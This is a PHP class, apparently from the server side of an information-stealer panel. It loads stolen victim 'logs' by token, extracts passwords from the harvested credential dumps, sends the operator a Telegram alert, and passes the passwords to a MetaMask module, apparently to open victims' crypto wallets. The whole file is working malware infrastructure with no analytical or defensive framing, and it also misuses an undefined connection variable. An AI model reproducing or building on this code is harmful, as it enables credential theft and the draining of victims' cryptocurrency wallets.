<?php

class CronManager
{
    private $connection;

    // ---------------------------------------------------------------------------------------
    // __construct
    //
    // class constructor
    // ---------------------------------------------------------------------------------------
    public function __construct($access_token)
    {
        $send_message = false;

        // -----------------------------------------------------------------------------------
        // connect to db
        $this->ConnectDB();

        $logsManager        = new LogsManager($this->connection);
        $telegramManager    = new TelegramManager($this->connection);

        $log = $logsManager->getLogByToken($access_token);
        $passwords = $this->ParsePasswords($log);

        if($log->log_status != 2)
        {
            $send_message = true;
            $log->log_status = 2;

            // -------------------------------------------------------------------------------
            // update log in db
            $logsManager->UpdateLog($log, false);
        }

        // -----------------------------------------------------------------------------------
        // send tg message
        if($send_message)
        {
            $telegramManager->SendNotify($log, true);
        }

        if (isset($log->log_info["plugins"]["MetaMask"])) 
        {
            new MetaMask($connection, $log, $passwords, $telegramManager);
        }

        // -----------------------------------------------------------------------------------
        // update log in db
        $logsManager->UpdateLog($log, false);
    }

    // ---------------------------------------------------------------------------------------
    // __destruct
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function __destruct()
    {
        mysqli_close($this->connection);
    }

    // ---------------------------------------------------------------------------------------
    // ConnectDB
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function ConnectDB()
    {
        $this->connection = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);

        if ($this->connection->connect_error)
        {
            die();
        }
    }

    public function ParsePasswords($log)
    {
        $passwords = [];

        $working = explode("\n", $log->array_passwords);
        $linec = 0;

        foreach($working as $line)
        {
            if($linec > 5)
			{
				$linec = 0;
			}

            $linec++;

            switch($linec)
            {
                case 5:
                    $password = substr($line, 10);
                    $passwords[] = $password;
                    break;
            }
        }

        return $passwords;
    }
}

?>